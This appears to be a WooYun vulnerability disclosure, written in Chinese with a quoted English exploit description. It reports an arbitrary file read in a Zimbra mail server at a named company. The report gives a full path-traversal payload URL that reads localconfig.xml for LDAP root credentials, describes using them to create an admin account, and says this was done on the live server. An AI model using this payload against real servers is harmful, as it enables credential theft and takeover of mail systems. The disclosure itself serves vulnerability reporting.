wybug_title: 天下网邮件服务器任意文件读取漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2013-12-10：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-01-24：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： Zimbra跟进一个 详细说明：  This script exploits a Local File Inclusion in/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgzwhich allows us to see localconfig.xmlthat contains LDAP root credentials wich allow us to make requests in/service/admin/soap API with the stolen LDAP credentials to create userwith administration privlegiesand gain acces to the Administration Console. LFI is located at :/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00 Example : https://mail.example.com/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00 or https://mail.example.com:7071/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00   漏洞证明：  简单运行exp，成功添加管理员账号：

登录邮箱mail.tx.com.cn：

登录管理页面：

   修复方案：  http://www.zimbra.com/   版权声明：转载请注明来源 phith0n@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
